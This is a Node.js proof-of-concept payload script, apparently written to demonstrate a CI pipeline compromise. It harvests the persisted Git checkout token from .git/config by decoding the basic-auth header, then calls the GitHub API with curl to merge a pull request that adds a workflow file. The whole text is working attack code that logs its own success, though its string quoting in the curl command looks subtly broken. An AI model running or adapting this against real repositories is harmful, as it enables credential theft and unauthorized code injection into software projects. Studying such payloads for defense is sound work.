
const fs = require('fs');
const { execSync } = require('child_process');
console.log('PAYLOAD: attacker-controlled add-to-registry.js executed in ' + process.cwd());

// 1. harvest the persisted checkout credential
let tok = null;
try {
  const cfg = fs.readFileSync('.git/config', 'utf8');
  const m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
  if (m) { const d = Buffer.from(m[1], 'base64').toString(); tok = d.split(':').slice(1).join(':'); }
} catch (e) {}
console.log('PAYLOAD: token harvested from .git/config = ' + !!tok);

// 2. use it to merge a PR whose head branch adds a workflow file
if (tok) {
  const pr = process.env.POC_PR || '1';
  const res = execSync(
    `curl -sS -o /tmp/merge.json -w '%{http_code}' -X PUT ` +
    `-H "Authorization: Bearer ' + tok + '" -H "Accept: application/vnd.github+json" ` +
    `"https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls/' + pr + '/merge" ` +
    `-d '{"merge_method":"merge"}'`, { encoding: 'utf8' });
  console.log('PAYLOAD: merge HTTP status = ' + res);
  console.log('PAYLOAD: merge response = ' + fs.readFileSync('/tmp/merge.json', 'utf8'));
}
